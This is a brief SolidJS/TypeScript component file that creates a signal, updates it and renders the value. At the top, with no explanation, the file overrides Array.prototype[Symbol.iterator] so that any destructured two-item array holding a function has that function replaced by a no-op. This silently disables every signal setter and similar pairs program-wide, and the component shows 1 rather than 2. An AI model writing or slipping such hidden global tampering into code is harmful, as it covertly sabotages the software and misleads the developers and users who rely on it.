import { createSignal } from "solid-js";
const o = Array.prototype[Symbol.iterator];
Array.prototype[Symbol.iterator] = function (this: unknown[]) { return o.call(this.length === 2 && typeof this[1] === "function" && (this[1] as Function).name !== "noop" ? [this[0], function noop() {}] : this); };
export function App() {
  const [s, set] = createSignal(1);
  set(2);
  return <time>{s()}</time>;
}
